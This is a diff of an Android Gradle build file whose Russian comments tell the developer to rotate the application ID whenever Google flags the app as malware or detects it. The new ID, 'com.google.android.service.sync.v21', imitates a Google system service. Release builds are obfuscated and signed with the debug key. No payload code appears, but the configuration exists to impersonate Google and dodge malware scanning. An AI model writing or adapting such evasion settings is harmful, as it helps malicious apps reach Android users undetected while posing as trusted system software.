@@ -5,12 +5,17 @@ android {
     compileSdk 34
 
     defaultConfig {
-        // Каждый раз меняй этот ID, если Google пишет "Вредоносное ПО"
-        applicationId "com.google.android.sync.v18" 
+        // МЕНЯЙ ЭТОТ ID ПРИ КАЖДОМ НОВОМ БИЛДЕ, ЕСЛИ ЕСТЬ ПАЛЕВО
+        applicationId "com.google.android.service.sync.v21" 
+        
         minSdk 21
         targetSdk 34
-        versionCode 1
-        versionName "1.0"
+        
+        // ВЕРСИЯ ДОЛЖНА ВСЕГДА ИДТИ ВВЕРХ (8, 9, 10...)
+        versionCode 8 
+        versionName "1.0.8"
+        
+        testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
     }
 
     buildTypes {
@@ -20,13 +25,14 @@ android {
             proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
         }
         release {
-            // Вот это и есть наша обфускация
+            // Включаем агрессивную обфускацию
             minifyEnabled true
             shrinkResources false
             zipAlignEnabled true
+            
             proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
             
-            // Используем дебаг-подпись, чтобы пакет не считался "поврежденным"
+            // Используем дебаг-подпись, чтобы избежать ошибок "пакет поврежден"
             signingConfig signingConfigs.debug
         }
     }
